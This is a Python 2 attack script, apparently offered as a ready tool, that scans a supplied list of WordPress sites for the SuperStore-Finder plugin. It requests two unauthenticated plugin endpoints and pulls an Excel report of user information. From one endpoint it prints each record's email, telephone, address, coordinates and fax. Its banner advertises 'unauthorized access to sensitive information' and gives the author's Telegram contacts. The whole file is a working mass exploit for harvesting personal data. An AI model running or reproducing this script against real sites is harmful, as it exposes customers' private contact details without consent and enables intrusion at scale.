#/usr/bin/python
# -*- coding:utf-8 -*-
import argparse
import json
import requests
import sys
import time
from time import sleep
import os
#from colorama import Fore, Back, Style

os.system('clear')
#class __animations():
def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush() # defeat buffering
        time.sleep(8./90)
#time.sleep(10./90)

def fastprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush() # defeat buffering
        time.sleep(1./50)

def Animation(String, color):
    animation = "|/-\\"
    for i in range(15):
        time.sleep(0.1)
        sys.stdout.write("\r" + "[" + animation[i % len(animation)] + "]" + color + String)
        sys.stdout.flush()
    print('')

class Collor():
    vermelho = '\033[31m'
    verde = '\033[32m'
    azul = '\033[34m'
    ciano = '\033[36m'
    purple = '\033[35m'
    amarelo = '\033[33m'
    preto = '\033[30m'
    branco = '\033[37m'
    verde_claro = '\033[39m'
    original = '\033[0;0m'



parser = argparse.ArgumentParser(description='SuperStore-Finder Wp Plugin')
parser.add_argument('-t','--targets', action='store',help='--targets Targets.txt')
parser.add_argument('-g','--getReport', action='store',help='--getReport true')
parser.add_argument('-j','--jsonWpml', action='store',help='--jsonWpml true')
args = parser.parse_args()

__banner = """
                                                  **                          
                 ******                          /**                          
  ****** **   **/**///**  *****  ******  ****** ******  ******  ******  ***** 
 **//// /**  /**/**  /** **///**//**//* **//// ///**/  **////**//**//* **///**
//***** /**  /**/****** /******* /** / //*****   /**  /**   /** /** / /*******
 /////**/**  /**/**///  /**////  /**    /////**  /**  /**   /** /**   /**//// 
 ****** //******/**     //******/***    ******   //** //****** /***   //******
//////   ////// //       ////// ///    //////     //   //////  ///     ////// 
   **** **               **               
  /**/ //               /**               
 ****** ** *******      /**  *****  ******
///**/ /**//**///**  ****** **///**//**//*	WORDPRESS VULNERABILITY 
  /**  /** /**  /** **///**/******* /** / 	Author: Luth1er
  /**  /** /**  /**/**  /**/**////  /**   	UNAUTHORIZED ACCESS TO SENSSITIVE INFORMATION
  /**  /** ***  /**//******//******/***   
  //   // ///   //  //////  ////// ///    

"""
print Collor.azul + __banner
fastprint(Collor.purple+"                 Telegram: "+Collor.ciano+"@Phantasm_Lab  "+Collor.purple+"    Telegram: "+Collor.ciano+"@DreadPirateRobertt")
print Collor.amarelo+''
Animation(" Superstorefinder-wp Scanner! ", Collor.ciano)
print ''
payload_I   = '/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/getReport.php'
payload_II  = '/wp-content/plugins/superstorefinder-wp/ssf-wp-json-wpml.php'
payload_III = ''

__targets = open(args.targets, 'r').readlines()


def get__host(__host):
	if "https://" in __host:
                __host = __host.split('https://')
                if "/" in __host[1]:
			__host = __host[1].split('/')
			return __host[0]
		else:
			return __host[1]
        elif "https://www." in __host:
                __host = __host.split('https://www.')
                if "/" in __host[1]:
                        __host = __host[1].split('/')
                        return __host[0]
                else:
                        return __host[1]

        elif "http://" in __host:
                __host = __host.split('http://')
                if "/" in __host[1]:
                        __host = __host[1].split('/')
                        return __host[0]
                else:
                        return __host[1]

        elif "http://www." in __host:
                __host = __host.split('http://www.')
                if "/" in __host[1]:
                        __host = __host[1].split('/')
                        return __host[0]
                else:
                        return __host[1]

def make_req(__url ,_host):
	__host = get__host(str(_host))
	_header = {
	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	'Accept-Encoding':'gzip, deflate, br',
	'Accept-Language':'en-US,en;q=0.5',
	'Connection':'keep-alive',
	'Host':__host,
	'Upgrade-Insecure-Requests':'1',
	'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0'}
	r = requests.get(__url, headers=_header)
	return r



def get_customers_informations(target):
	r = make_req(target+payload_II,target)
	print "Server Status: " + str(r.status_code)
	try:
		json_data = json.loads(r.text)
		for data_ in json_data['item']:
			print Collor.verde+"Country:   " +Collor.vermelho+ data_['country']
			print Collor.verde+"Email:     " +Collor.vermelho+ data_['email']
			print Collor.verde+"Telephone: " +Collor.vermelho+ data_['telephone']
			print Collor.verde+"Address:   " +Collor.vermelho+ data_['address']
			print Collor.verde+"latitude:  " +Collor.vermelho+ data_['latitude']
			print Collor.verde+"longitude  " +Collor.vermelho+ data_['longitude']
			print Collor.verde+"fax:       " +Collor.vermelho+ data_['fax']
			print ''
			sleep(0.1)
	except:
		print "Open the link: "+ target+payload_II
		pass





def getReport(__host):
	getReportVerify = make_req(__host+payload_I,__host)
	if str(getReportVerify.headers['Content-Type']) == 'application/vnd.ms-excel':
		Animation(" Download Report Contain Sensitive Users Information! ", Collor.amarelo)
		print ''
		try:
			print Collor.verde+"Host: "                +Collor.vermelho+ __host
		except:
			pass
		try:
			print Collor.verde+"Content-Type: "        +Collor.vermelho+ getReportVerify.headers['Content-Type']
		except:
                        pass
		try:
			print Collor.verde+"Content-Disposition: " +Collor.vermelho+ getReportVerify.headers['Content-Disposition']
		except:
                        pass
		try:
			print Collor.verde+"Transfer-Encoding: "   +Collor.vermelho+ getReportVerify.headers['Transfer-Encoding']
		except:
                        pass
		try:
			print Collor.verde+"Date: "                +Collor.vermelho+ getReportVerify.headers['Date']
		except:
                        pass
		try:
			print Collor.verde+"Keep-Alive: "          +Collor.vermelho+ getReportVerify.headers['Keep-Alive']
		except:
                        pass
		try:
			print Collor.verde+"Server: "              +Collor.vermelho+ getReportVerify.headers['Server']
		except:
                        pass
		try:
			print Collor.verde+"Connection: "          +Collor.vermelho+ getReportVerify.headers['Connection']
		except:
                        pass
		try:
			print Collor.verde+"Vary: "                +Collor.vermelho+ getReportVerify.headers['Vary']
		except:
                        pass
	else:
		print Collor.verde+__host+Collor.vermelho+": [!] getReport Not Found"
	print ''



def main():
	if args.getReport == 'true':
		for url in __targets:
			url = url.strip()
			getReport(url)
	elif args.jsonWpml == 'true':
		for url in __targets:
			url = url.strip()
			get_customers_informations(url)

if __name__ == '__main__':
	try:
		main()
	except Exception as e:
		print Collor.vermelho+"[!] Error as " , e
		exit()
	except KeyboardInterrupt:
		fastprint(Collor.vermelho+"[!] Keyboard as Interrupt....")
		exit()
